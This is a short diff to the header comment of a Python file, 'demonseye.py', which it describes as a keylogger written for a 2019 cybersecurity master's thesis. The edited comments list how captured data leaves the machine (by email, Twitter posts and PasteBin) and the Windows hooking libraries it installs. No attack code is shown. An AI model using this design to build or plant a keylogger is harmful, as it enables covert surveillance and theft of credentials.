@@ -3,13 +3,14 @@
 #
 #   demonseye.py
 #
-#   TFM La Salle 2019
+#   Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
+#
 #   Autor ..........:   Gabriel Marti Fuentes,  gabimarti@gmail.com
 #   Fecha ..........:   19/05/2019
 #
-#   Caractersticas .:   Correo
-#                       Twitter
-#                       Paste
+#   Caracteristicas :   Envio por Correo
+#                       Posteo en Twitter
+#                       Paste en PasteBin
 #
 #   pip install pywin32
 #   pip install pyWinhook
